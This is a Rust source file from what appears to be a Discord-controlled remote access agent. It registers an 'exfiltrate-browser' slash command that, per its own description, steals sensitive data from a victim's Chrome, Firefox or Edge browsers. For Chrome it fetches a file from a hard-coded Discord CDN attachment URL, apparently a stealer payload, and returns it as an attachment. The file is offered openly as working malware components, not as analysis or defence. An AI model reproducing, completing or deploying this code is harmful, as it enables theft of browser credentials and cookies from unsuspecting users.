use crate::os::download::{download_file, generate_attachment};
use serenity::{
    builder::CreateApplicationCommand,
    model::{
        application::{
            command::CommandOptionType,
            interaction::application_command::{CommandDataOption, CommandDataOptionValue},
        },
        channel::AttachmentType,
    },
};
use tempfile::TempDir;
use uuid::Uuid;


pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicationCommand {
    // Create the purge command.
    command
        .name("exfiltrate-browser")
        .description("Exfiltrates sensitive data from the user's browsers via the agent.")
        .create_option(|option| {
            option
                .name("browser")
                .description("A supported browser (chrome, firefox, edge)")
                .kind(CommandOptionType::String)
                .add_string_choice("Chrome", "Chrome")
                .add_string_choice("Firefox", "Firefox")
                .add_string_choice("Edge", "Edge")
                .required(true)
        })
}

pub async fn run(options: &[CommandDataOption]) -> Option<AttachmentType> {
    let option = options
        .get(0)
        .expect("Expected browser option.")
        .resolved
        .as_ref()
        .expect("Expected browser object.");

    if let CommandDataOptionValue::String(browser) = option {
        match browser.as_str() {
            "Chrome" => exfiltrate_browser("Chrome").await,
            "Firefox" => exfiltrate_browser("Firefox").await,
            "Edge" => exfiltrate_browser("Edge").await,
            _ => panic!("Unsupported browser: {}", browser),
        }
    } else {
        None
    }
}

// Main exfiltrate function. Takes the browser string and deployed the proper module.
async fn exfiltrate_browser(browser: &str) -> Option<AttachmentType<'static>> {
    let temp_dir = TempDir::new().unwrap();
    if browser == "Chrome" {
        let url = "https://cdn.discordapp.com/attachments/1102741318905626688/1102746525035143299/3126786178316y237813";
        let filename = "1";
        Some(handle_download(temp_dir, url, filename).await)
    } else {
        None
    }
}

// Helper function to handle all the download requests.
async fn handle_download(temp_dir: TempDir, url: &str, filename: &str) -> AttachmentType<'static> {
    let temp_file_path = temp_dir.path().join(Uuid::new_v4().to_string());
    download_file(url, filename, &temp_file_path)
        .await
        .expect("Error when downloading the file.");
    let attachment_data = generate_attachment(temp_file_path).await.unwrap(); // This reads the attachment data into memory and stores it as an AttachmentType.
    attachment_data
}
